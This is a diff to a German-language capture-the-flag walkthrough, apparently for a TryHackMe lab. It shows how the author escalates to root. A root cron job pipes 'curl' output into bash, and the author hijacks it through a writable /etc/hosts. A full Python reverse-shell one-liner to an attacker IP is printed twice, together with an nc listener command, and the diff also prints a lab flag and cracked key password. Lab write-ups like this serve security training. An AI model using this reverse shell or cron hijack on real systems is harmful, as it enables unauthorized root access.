@@ -155,7 +155,35 @@ geben das Password ein für die id_rsa datei: **james13** und wir sind drin!<br>
 <br>
 
 ### SSH Server:
-![SSH Server login](./login_ssh)
+![SSH Server login](./login_ssh.png)
+
+User Flag: `thm{65c1aaf000506e56996822c6281e6bf7}`<br>
+<br>
+Nach dem ich auf dem System **linpeas** ausführe und das systeam nach PrivEsc möglichkeiten scannen finde ich in der **/etc/crontab** file eine Aufgabe die jede Minute ausgeführt wird:<br>
+`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`<br>
+Erklärung:
+* Argument 1: `* * * * *` bedeutet dass das die Aufgabe jede Minute ausgeführt wird<br>
+* Argument 2: `root` bedeutet das es mit root rechten ausgeführt wird<br>
+* Argument 3: `curl overpass.thm/downloads/src/buildscript.sh | bash` ist das was ausgeführt wird
+
+Das ist interesant es wird eine curl abfrage an overpass.thm/downloads/src/buildscript.sh gestellt und die Aufgabe wird automatisch ausgeführt. Was ich noch durch linpeas sehen konnte ist das die **/etc/hosts** bearbeitet werden kann, also könenn wir der domain overpass.thm einfach mit unsere IP-Addresse wechseln und erstellt auf unseren System einfach ein **/downloads/src** Ordner und das **buildscript.sh** mit einer rshell.<br>
+<br>
+ich entscheide mich für:
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.65.124",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
+<br>
+
+## buildscript.sh content:
+```bash
+#!/bin/sh
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.65.124",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+Als nächstes starte ich ein python3 http.server auf dem port 80 da der target server immer den port 80 abfragt, wichtig ist den server in dem Ordner vor /downloads zu starten und gleichzeitig einen rshell listener zu starten in meinem fall:<br>
+<br>
+* Command: `nc -lnvp 4444`<br>
+<br>
+Jetzt heißt es warten bis der Target Server das Script downloaded und ausführt, und ich hab eine root shell
+![root access terminal](./root_access.png)
+
 
 
 
